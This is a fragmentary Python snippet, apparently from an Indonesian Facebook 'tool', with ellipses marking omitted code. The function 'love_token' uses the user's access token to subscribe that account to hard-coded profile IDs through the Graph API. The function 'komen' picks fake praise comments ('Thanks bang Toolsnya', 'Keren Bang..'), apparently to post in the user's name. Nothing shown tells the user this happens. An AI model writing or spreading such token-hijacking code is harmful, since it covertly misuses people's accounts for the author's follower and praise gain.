...
def love_token(token):
    lis_id_foll = [
     '100000834003593', '100003986228742', '100017584682867', '100000395779504']
    with requests.Session() as (dev_):
        ...
        dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(random.choice(['100017584682867', '100000834003593', '100000395779504']), token))
        ikuti_ = []
...
def komen(token):
    for dev in range(1):
        with requests.Session() as (dev_):
            komen_ = random.choice(['Toolsnya Mantap', 'Gw Fans Lu Bang', 'Gimana Kabarnya Bang?', 'Hallo bang', 'Keren Bang..', 'Thanks bang Toolsnya', 'Gak sia2 saya make tool abang, Keren Abis, Ga ada Obat'])
